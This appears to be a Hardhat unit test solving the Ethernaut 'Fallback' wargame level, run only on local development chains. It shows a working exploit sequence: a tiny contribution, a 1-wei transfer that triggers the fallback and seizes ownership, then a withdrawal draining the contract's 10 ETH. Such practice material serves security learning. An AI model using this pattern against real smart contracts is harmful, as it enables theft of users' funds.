const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")
const { increaseTime, tx2bal } = require("../../utils/utils")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_fallback Unit Tests", function () {
        let owner, user1, Fallback
        beforeEach(async () => {
            ;[owner, user1] = await ethers.getSigners()
            const FallbackContract = await ethers.getContractFactory("Fallback")
            // 默认铸造 10eth
            Fallback = await FallbackContract.deploy()

            await owner.sendTransaction({
                to: Fallback.address,
                value: parseEther("10"),
            })
        })

        describe("break it", () => {
            it("default attack", async function () {
                await Fallback.connect(user1).contribute({
                    value: parseEther("0.0001"),
                })
                await user1.sendTransaction({
                    to: Fallback.address,
                    value: 1,
                })
                // owner change
                expect(await Fallback.owner()).to.equal(user1.address)

                // balance change
                let tx = () => Fallback.connect(user1).withdraw()
                expect(await tx2bal(user1.address, tx)).to.equal(
                    parseEther((10 + 0.0001).toString()).add(1)
                )

                expect(await getBalance(Fallback.address)).to.equal(0)
            })
        })
    })
}
